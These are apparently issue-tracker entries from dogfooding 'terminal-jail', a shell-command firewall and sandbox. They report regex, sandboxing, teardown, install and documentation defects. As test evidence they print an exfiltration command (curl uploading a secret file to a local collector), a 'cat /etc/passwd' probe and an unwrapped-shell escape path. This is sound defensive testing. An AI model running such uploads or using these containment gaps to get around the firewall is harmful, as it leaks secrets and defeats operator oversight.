title: [P1] License-clean bubblewrap install path: system-package runtime dependency only (LGPL-2.1+), never vendored into this MIT repo
detail: bubblewrap is LGPL-2.1-or-later; terminal-jail is MIT. Invoking an installed bwrap BINARY across a process boundary is NOT linking and creates no derivative-work obligation — but shipping/bundling/fetching the binary (vendoring, static link, 'install.sh downloads bwrap') WOULD create redistribution duties the MIT repo must not silently take on. Scope: (a) install.sh detects bwrap via command -v; when absent in release mode it PRINTS the distro package command (apt install bubblewrap / dnf install bubblewrap) and continues with the unshare backend — it must NEVER download or embed the binary; (b) README + specs document the optional dependency with its license and the no-vendoring rule; (c) a NOTICE/THIRD_PARTY note listing bubblewrap (LGPL-2.1+) as an optional runtime dependency, mirroring how the repo already treats PyYAML/util-linux; (d) CI check: no bwrap binary/artifact may enter the repo tree or the release assets (grep + size guard); (e) TERMINAL_JAIL_BWRAP path override so operators can point at their own build. PASS: fresh-container run of install.sh with bwrap absent exits 0, prints the package hint, installs nothing LGPL; grep -r 'bwrap' release assets/CI artifacts = binaries none; README documents the dependency + license.

title: [dogfood:P2] allow-cat-safe's negative lookahead can never match its advertised exclusion — the rule is a silent no-op exactly where its description says it matters
detail: Shipped rule (plugin/terminal_jail/rules/00-builtins.yaml, allow-cat-safe, description 'Safe file reads (non-sensitive paths)'): pattern `^cat\s(?!.*/(etc|boot|proc|sys))`. The `.*` inside the lookahead can match the empty string, so ANY command whose path starts with /etc, /boot, /proc or /sys fails the lookahead and the rule does not match — proved standalone: re.match(pattern, 'cat /etc/passwd') -> False, while 'cat /tmp/x' -> True. Consequence: on sensitive paths the rule silently vanishes and `cat /etc/passwd` is allowed by DEFAULT-ALLOW (rule_id null, live-probed) rather than by any explicit decision; on benign paths it only adds a redundant allow. The description promises discrimination the regex cannot deliver.

title: [P1] Auto-sandbox pipeline reconstruction drops pipe operators: a sandboxed pipeline executes a DIFFERENT command than the user typed
detail: Found by the TJ-GAP-058 worker and re-verified foreman-side at 9fda86a. Live `intercept("go test ./... | tee /tmp/log")` -> action=modify, modified="unshare --user --pid --fork --kill-child=SIGKILL bash -c 'go test ./...' tee /tmp/log" — the `|` is gone, so `tee /tmp/log` becomes an ARGUMENT to the sandboxed `go test` instead of a second pipeline stage. Cause: the aggregate MODIFY path joins the modified segments with a single space (" ".join(modified_segments) in decider.py) instead of re-joining with the operator that separated them. Affects every pipeline that hits any sandbox rule, not just the new net rules.

title: [dogfood:P1] Auto-sandbox on uid-mapping hosts rewrites commands into a launch that cannot read the caller's own files (payload = caller's subuid, not the caller)
detail: plugin/terminal_jail/interruptor/userns.py::unshare_prefix() selects the MAPPED prefix whenever mapped_launch_ok() is True, and that preflight is `unshare --user --map-users=65534:<subuid>:1 --map-groups=65534:<subgid>:1 -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL true` — it proves the namespace can be CREATED, never that the payload can still reach the user's files. With -S 65534 -G 65534 + --map-users=<subuid> the payload's host uid is the caller's SUBUID, so DAC denies the caller's home (drwx------). Verified live on a fresh ephemeral Debian 13 host (bunker-las-02, subuid 1803936): `cd ~/terminal-jail && terminal-jail python3 scripts/pidns-capability-probe.py` (the quickstart's own §3a Step-1 command, through the tool) -> `python3: can't open file '/home/bunker-<id>/terminal-jail/scripts/pidns-capability-probe.py': [Errno 13] Permission denied` rc=2, while the direct run prints FULL; `terminal-jail python3 ~/writer.py` -> Permission denied rc=2; script copied to world-readable /tmp -> runs, then its $HOME and repo writes fail PermissionError(13) with rc=0 (partial SILENT failure). Hand-run control: the mapped form cannot `ls` the caller's file, the legacy form reads it and the script runs/writes. The project's dev host is DEGRADED (AppArmor denies uid mapping) so only the legacy branch is ever exercised in CI, tests and prior dogfood runs — the defect is invisible there. title: [dogfood:P1] The egress pack's MODIFY verdicts do not prevent exfiltration — a real collector received the uploaded secret file (only a BLOCK would)
detail: Measured with a real local collector at HEAD 5275a86: bridge verdict for `curl -s -T /tmp/dogfood-tj/secret.txt http://127.0.0.1:18777/collect` -> {"action":"modify","rule_id":"builtin-net-curl-upload"}; the CLI ran the rewritten command `unshare --user --pid --fork --kill-child=SIGKILL bash -c 'curl -s -T …/secret.txt http://127.0.0.1:18777/collect'`, exit 0, and the collector received 132 bytes containing the secret content (FAKE_PRIVATE_KEY_MATERIAL). So builtin-net-curl-upload (and the whole BUILTIN_SANDBOX egress group added by TJ-GAP-058) contains the process; it does not stop the data leaving. The commit message describes the group as covering 'sandbox exfil', and a reader of the README's rule table reasonably reads auto-sandbox as a mitigation — it is not: on the mapping-less (legacy) branch the sandboxed curl reads the caller's file fine and the upload completes; on a mapped branch the upload fails only because the payload cannot read the caller's files at all (DF-15), not because of any security decision. Net effect: an agent or user who is exfiltrating still succeeds whenever the rule is the only thing in the way.

title: [P1] `install.sh --rule-pack <name>` aborts the ENTIRE install on a machine without PyYAML - the documented pack path leaves a fresh user with nothing installed
detail: Fresh box (bunker-las-02, Debian, python3 3.13.5): the README Rule-packs flow `./install.sh --rule-pack db` printed `rule-pack-tool: refused: .../rules/packs/db.yaml: cannot parse (JSONDecodeError: Expecting value: line 1 column 1 (char 0))` then `rule pack 'db' REFUSED - nothing was written`, exit 2, and NO wrapper was installed (`~/.local/bin/terminal-jail` absent). Cause: scripts/rule-pack-tool.py parses YAML with PyYAML and falls back to json, so on a host without PyYAML a valid pack is a guaranteed JSONDecodeError; the docs say only 'installing a pack requires python3' and never name PyYAML, and a bare user cannot install it (no pip, `sudo` needs a password). Because install.sh runs `set -eu`, the refusal also ends the whole install instead of skipping the pack. Control on the SAME box without the flag: install clean, `terminal-jail --version` = 1.1.0, `chmod 777 /tmp/x` -> COMMAND BLOCKED builtin-chmod-777-root rc=126. Fix direction: (a) detect PyYAML before the pack phase and fail with a message that names the dependency and the remedy; (b) do not let a pack refusal abort the base install - install the wrapper and report the pack as skipped; (c) document the requirement (README + quickstart + specs/cli.md). Add a fresh-machine (no-PyYAML) install cell to the battery so this cannot regress.

title: [P1] Interruptor engine freezes on long command arguments: one 8KB argument = 7.5s CPU inside intercept(), 20KB+ never returns (matcher.py:115 regex backtracking) — a latency self-DoS on every shimmed shell invocation
description: Found 2026-09-24 dogfood (firewall-as-a-library angle) by probing the documented JSON bridge with oversized arguments. Bisect: 500B arg = 0.11s, 2KB = 0.65s, 8KB = 9.2s bridge wall (7.491s intercept() alone), 20KB = >10s timeout. cProfile: matcher.py:115 _match_pattern — 145 re.Pattern.search calls, 7.555s of 7.566s (99.8% self-time); parser is 4ms. The rule regexes backtrack catastrophically on long tokens. The deployed shim (terminal-jail-sh) evaluates EVERY gateway shell invocation through this bridge before exec, so any multi-KB command argument (base64 blob, heredoc in a variable, long prompt echo) freezes the shell seconds-to-forever without any security rule firing. Perf evidence: warm bridge verdict on a normal command is 131.0ms±9.4ms (python startup dominated) — the blowup is purely argument-length-driven.

title: [P1] unshare-backend orphan teardown fails on fresh Debian 13 (kernel 6.12): payload survives the wrapper's death for >15s; bwrap backend passes on the same box; unshare path passes on the dev host (kernel 7.0.0-31) — the --kill-child containment contract is kernel-dependent and the shipped rule catalog was never proved outside the dev host
description: Found 2026-09-25 dogfood on a fresh bunker-las-03 agent (bare Debian 13.7, kernel 6.12.107, python 3.13): test_live_unshare_orphan_teardown FAILED 3/3 deterministically — 'orphan: unshare payload 96640 survived the wrapper's death for 15s' (15.30s each). The bwrap-backend twin test passed on the SAME box (0.31s), isolating the defect to the unshare --kill-child teardown path. On the dev host (Ubuntu 26.04, kernel 7.0.0-31) the same test passes in 0.45s. Every prior dogfood run and the E2E battery (52 PASS, tick #322) ran on the dev host kernel only, so a fresh-machine user on current stable Debian gets a weaker containment guarantee than the tests advertise.
acceptance_criteria: Reproduce on any Debian 13 / 6.12 machine: python3 -m pytest plugin/test_backend_parity.py::test_live_unshare_orphan_teardown -> must PASS (payload dead within the 15s window) or the test must encode the kernel-version matrix explicitly; decide the contract: (a) belt-and-braces teardown (kill the wrapper's process group or a post-death verify-and-kill sweep, mirroring the test's own cleanup path) so the guarantee holds without --kill-child, or (b) document a minimum kernel/kernel-config requirement in README Requirements + COMPATIBILITY.md.

title: [P2] systemd-directive-probe RestrictNamespaces judge has no host-baseline negative control — on hosts where unprivileged userns is globally denied (e.g. Ubuntu AppArmor unprivileged_userns), the directive reads ENFORCED regardless of the unit's own setting
description: Found 2026-09-25 dogfood running scripts/systemd-directive-probe.py (both scopes) as the deploy doc's Step 4 prescribes. Judge at scripts/systemd-directive-probe.py:252-258 treats ANY nonzero RNS_RC as ENFORCED ('unshare --user --pid denied'). But on a host whose kernel/AppArmor denies unprivileged userns globally, the in-unit probe fails for the host reason, not the directive's — indistinguishable from real enforcement. On THIS host the verdict happens to be correct (host unshare --user --pid rc=0 vs in-unit rc=1), but that is luck, not method: every other directive in the probe is paired with a control (CloseOnExec load-control, AF_UNIX inside the payload), this one is not.
acceptance_criteria: Add the missing control: run the same unshare probe once OUTSIDE the transient unit and store the host rc; verdict = ENFORCED only when host rc==0 and unit rc!=0; when host rc!=0 emit UNKNOWN ('host denies unprivileged userns — directive effect not distinguishable'), matching the probe's existing UNKNOWN vocabulary.
detail: Repro: scripts/systemd-directive-probe.py --json --scope user -> RestrictNamespaces ENFORCED 'unshare --user --pid denied (rc=1)'; host control: unshare --user --pid true -> rc=0 (so correct here). On a global-deny host (the documented fs-isolation-probe failure class, e.g. unprivileged_userns AppArmor) the same judge would print ENFORCED with the directive absent.

title: [P3] deploy doc Step 3 expected output 'PID = 1 (inside namespace)' holds only for the unshare backend — with the default auto backend on a bwrap-capable host bash is PID 2 (PID 1 is bwrap), so the documented verify step reads as a failure for a fresh user
description: Found 2026-09-25 dogfood executing docs/deploy-to-karahermes.md Step 3 verbatim on the dev host: '/usr/local/bin/terminal-jail-sh -c "echo pid inside jail: $$"' printed 'pid inside jail: 2', and ps inside the jail shows PID 1 = bwrap, 2 = bash (TERMINAL_JAIL_JAIL_BACKEND=auto selects bwrap when present). The containment is correct; the documented expectation is backend-specific and a naive user fails the verification.
acceptance_criteria: docs/deploy-to-karahermes.md Step 3 states the expected PID for each backend (unshare: 1; bwrap/auto: 2) or replaces the probe with a backend-agnostic one (e.g. read the jail's pid-ns inode vs /proc/1/ns/pid, as the CLI smoke uses).
detail: Observed: bwrap auto-selected, bash PID 2, PID 1 bwrap; COMPATIBILITY.md documents the bwrap backend row but the deploy doc's verify step was not updated for it.

title: [P3] Shim used as an interactive/login shell (terminal-jail-sh -lic with no command string) execs a completely unwrapped /bin/bash — the fallback path for empty cmd is undocumented as an escape hatch and invisible in help
description: Found 2026-09-25 dogfood probing the shim's non-documented invocation forms: 'echo cmd | terminal-jail-sh -lic' runs the banner path with cmd empty -> exec /bin/bash "$@" with NO firewall, NO namespace, NO seccomp and no stderr note. For the deploy's gateway form (-c with a command) the wrap always applies, but any caller shape that leaves cmd empty silently gets zero containment. standalone/terminal-jail-sh:53-55.
acceptance_criteria: Either emit a one-line stderr notice on the unwrapped-banner path ('terminal-jail: no command string — running unwrapped') or document the empty-cmd behavior next to the setpriv-degradation note; a future caller should never discover the gap by reading source.
detail: Repro: echo 'echo hi; exit' | terminal-jail-sh -lic -> 'hi', rc=0, no warning line (contrast: the -c path prints the fs-isolation warning on degraded hosts).

title: [P3] Version/upgrade story is unresolved: fresh-install builds terminal-jail-1.2.0 from the repo, but the QA upgrade cell expects a published terminal-jail==1.0.0 on PyPI ('from versions: none') — no release channel exists behind the versioned package identity

The repo publishes install-from-source only (README Install), yet pyproject.toml carries a 1.2.0 version that a consumer cannot resolve from any index. title: [P2] metrics-export.py can only ever export zeros — the Metrics dataclass has no increment site anywhere in non-test code
description: Found 2026-09-25 dogfood (operator-tooling angle, run 11). plugin/terminal_jail/plugin.py defines Metrics (9 counters: commands_wrapped, commands_wrapped_user_ns, commands_passed_disabled, commands_passed_no_unshare, jail_crashes, byte_budget_rejections, wrap_time_ns_total, wrap_count, perf_regression_alert_count) plus get_metrics()/reset_metrics(), but repo-wide grep shows no non-test increment site; the plugin hooks in plugin/__init__.py log and return without counting. scripts/metrics-export.py therefore exports a structurally all-zero JSON forever, and test_metrics_export.py passes by asserting the shape of zeros. README's 'observability (metrics, logging)' promise is a stub with a polished CLI on top. Fix direction: increment the counters from the hooks that already fire (pre_tool_call observability), or from the standalone CLI's wrap path for wrap_count/wrap_time_ns_total; if observability-only is a deliberate v1 boundary, say so in README + metrics-export docstring so the zeros stop implying measurement.
acceptance_criteria: Either (a) at least commands_wrapped and wrap_count increment on a real wrap path and a live session shows non-zero totals in metrics-export.py --json, or (b) README observability row + metrics-export.py docstring explicitly state counters are unwired placeholders (no silent zeros).
detail: Evidence: python3 scripts/metrics-export.py --json → all 0; grep -rn 'commands_wrapped|wrap_count|jail_crashes|byte_budget' --include='*.py' . (non-test) → only plugin.py dataclass + metrics-export.py reader.

title: [P2] A validator-approved custom rule pack has no install path — install.sh --rule-pack accepts only packs shipped in the repo checkout
description: Found 2026-09-25 dogfood run 11. rule-pack-tool.py validate exists to vet a pack BEFORE the installer writes it (TJ-GAP-061), and its success output names the destination (<rules dir>/terminal-jail-pack-<name>.yaml) — but install.sh --rule-pack <name> resolves <name> only against plugin/terminal_jail/rules/packs/<name>.yaml (unknown-name skip, exit 2 when requested). There is no --rule-pack-file <path> or equivalent for an externally authored pack. A real operator validated a pack end-to-end, then had to hand-cp it into the rules dir — a path nothing validates at install time and nothing documents. Fix direction: add --rule-pack-file <path> that runs the same validator then byte-copies to the resolved rules dir (and is undone by a symmetric uninstall flag).
acceptance_criteria: install.sh --rule-pack-file /path/pack.yaml on a scratch TERMINAL_JAIL_INSTALL_DIR installs the pack iff validate passes, with the same loud-skip/refusal contract as --rule-pack; documented in README Rule-packs section.
detail: Evidence: ./install.sh --rule-pack ops → 'skipped: pack ops — unknown pack name (no .../rules/packs/ops.yaml)' exit 2; rule-pack-tool.py validate pack-ops.yaml --pack-name ops → valid, names destination; manual cp was the only path.

title: [P2] Pack-authoring schema is learnable only from source — first 4 authoring attempts refused on undiscoverable match.type vocabulary
description: Found 2026-09-25 dogfood run 11. Authoring a 2-rule pack from scratch: every attempt refused with "match type 'regex' is not dispatchable by the engine (valid: [command, composite, heredoc, network, path, pattern, pipeline, subcommand, syscall])" — the valid vocabulary appears ONLY in the refusal message and specs/interruptor.md §3.4; README's Rule-packs section covers install/remove of shipped packs; --help teaches no schema. The validator is an excellent backstop but there is no front door. ~15 min of the run went to schema discovery by reading source (the skill's 'had to read source to proceed' is itself the finding). Fix direction: 'rule-pack-tool.py schema' (print valid fields + a minimal valid example) or an example-pack.yaml shipped next to db.yaml, plus a short 'authoring a pack' section in the README.
acceptance_criteria: A pack author following ONLY documented material (README + --help) produces a valid pack on the first or second attempt; documented example carries action, priority, match.type=pattern, pattern, and message fields.
detail: Evidence: 4 refused validations (regex type, then ns/dup/action variants once pattern was learned); db.yaml header comment was the only in-repo authoring guidance found.
